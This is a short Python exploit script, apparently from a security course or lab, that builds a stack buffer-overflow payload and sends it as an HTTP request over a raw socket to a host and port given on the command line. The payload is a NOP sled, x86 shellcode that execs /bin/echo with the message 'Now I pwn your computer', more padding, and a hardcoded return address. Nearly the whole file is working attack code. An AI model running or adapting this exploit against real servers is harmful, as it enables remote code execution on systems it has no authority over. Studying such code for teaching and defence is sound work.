#!/usr/local/bin/python
import sys
import socket
import traceback

####





def build_exploit():

     
    req =""

    for i in range(1,900):
        req = req + "\x90" 
    req = req + "\xe9\x2b\x00\x00\x00\x00\x5e\x89\xf2\x83\xec\x0c\x89\x14\x24" 
    req = req + "\x83\xc2\x09\x83\xc2\x01\x89\x54\x24\x04\xc7\x44\x24\x08\x00" 

    req = req + "\x00\x00\x00\xb8\x0b\x00\x00\x00\x89\xf3\x89\x0c\x24\x89\x54"
    req = req + "\x24\x08\xcd\x80\xe8\xd0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x65" 
    req = req + "\x63\x68\x6f\x00\x4e\x6f\x77\x20\x49\x20\x70\x77\x6e\x20\x79" 
    req = req + "\x6f\x75\x72\x20\x63\x6f\x6d\x70\x75\x74\x65\x72\x00" 

    for i in range(1,69):
        req = req + "\x90" 

    req = req + "\x0c\xd4\xff\xff\n"
          
    return req 

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host,port))

    sock.send(req)

    rbuf = sock.recv(1024)
    resp =""
    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)
    
    sock.close()
    return resp

####


if len(sys.argv) != 3:
   print("Usage: " + sys.argv[0] + " host port")
   exit()

try:

   req = build_exploit()
   print("HTTP request:")
   print(req)

   resp = send_req(sys.argv[1], int(sys.argv[2]), req)
   print("HTTP response:")
   print(resp)
except:
   print("Exception:")
   print(traceback.format_exc())

